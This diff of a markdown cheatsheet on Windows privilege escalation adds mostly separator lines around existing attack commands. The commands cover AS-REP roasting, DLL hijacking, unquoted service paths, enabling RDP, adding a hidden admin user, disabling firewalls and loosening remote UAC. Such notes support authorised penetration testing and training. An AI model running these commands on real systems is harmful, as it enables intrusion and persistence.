@@ -2,6 +2,8 @@
 Simple helpsheet or cheatsheet whatever you want to call it for enumerating machines, guidance on good commands to run, etc,.
 Probably wont put any linux since its straightforward but windows, idk man privs are always weird
 
+----------------------------------------------------------------------
+
 ## Windows
 
 ### Checklist from start to finish!
@@ -37,9 +39,13 @@ Probably wont put any linux since its straightforward but windows, idk man privs
     - Look in previously unaccessible directories for log or credential files
     - Establish persistance
 
+----------------------------------------------------------------------
+
 ### Credential one-liner
 
 ```$pwd = ConvertTo-SecureString 'password' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential('DOMAIN\username', $pwd)```
+
+----------------------------------------------------------------------
 
 ### Kerbrute
 
@@ -49,7 +55,7 @@ If we find a valid username see if preauth is set, easy win
 
 ```impacket-GetNPUsers -request -dc-ip {ip} domain/username```
 
-
+----------------------------------------------------------------------
 
 ### PowerShell
 
@@ -91,6 +97,7 @@ If we find a valid username see if preauth is set, easy win
 
 ```PS> Get-Process backup -ErrorAction SilentlyContinue | Watch-Command -Difference -Continuous -Seconds 10```
 
+----------------------------------------------------------------------
 
 ### Service DLL Hijacking
 DLL Safe boot order:
@@ -100,7 +107,7 @@ DLL Safe boot order:
 4. The Windows directory. 
 5. The current directory.
 6. The directories that are listed in the PATH environment variable.
-----------------------------------------------------------------------
+
 - Copy suspicious binary to our attack windows machine
 - Execute ProcMon to monitor the binary as it is started to see what DLLs it is loading
 - Create file can be used to create or open a file, dont be fooled!
@@ -108,6 +115,7 @@ DLL Safe boot order:
 
 ```PS> Restart-Service {service}```
 
+----------------------------------------------------------------------
 
 ### Unquoted service paths
 - If the service path is unquoted and contains spaces we can probably hijack
@@ -119,6 +127,7 @@ DLL Safe boot order:
 
 ```cmd> wmic service get name,pathname |  findstr /i /v "C:\Windows\\" | findstr /i /v """```
 
+----------------------------------------------------------------------
 
 ### Scheduled Tasks
 
@@ -130,6 +139,7 @@ DLL Safe boot order:
 
 ```PS> schtasks /query /fo LIST /v | Out-String -Stream | Select-String -Pattern "^Folder:" -Context 0,3 | Where-Object { $_ -notmatch "\\Microsoft" } | ForEach-Object { $_.Context.PostContext[0] }```
 
+----------------------------------------------------------------------
 
 ### Enable RDP
 
@@ -137,15 +147,21 @@ DLL Safe boot order:
 
 ```cmd> reg add \"HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f```
 
+----------------------------------------------------------------------
+
 ### Add new user
 
 ```cmd> net user yam P@ssword123 /add```
 
 ```cmd> net localgroup Administrators yam /add```
 
+----------------------------------------------------------------------
+
 ### Disable firewalls
 
 ```cmd> netsh advfirewall set allprofiles state off```
+
+----------------------------------------------------------------------
 
 ### Share access
 
@@ -156,6 +172,8 @@ DLL Safe boot order:
 ```cmd> reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f```
 
 ```cmd> reg add \"HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f```
+
+----------------------------------------------------------------------
 
 ### Easy SMB transfers
 
@@ -168,6 +186,8 @@ DLL Safe boot order:
 ```cmd> del {file}```
 
 ```cmd> net use /d```
+
+----------------------------------------------------------------------
 
 ### Dumping LSASS without mimikatz
 
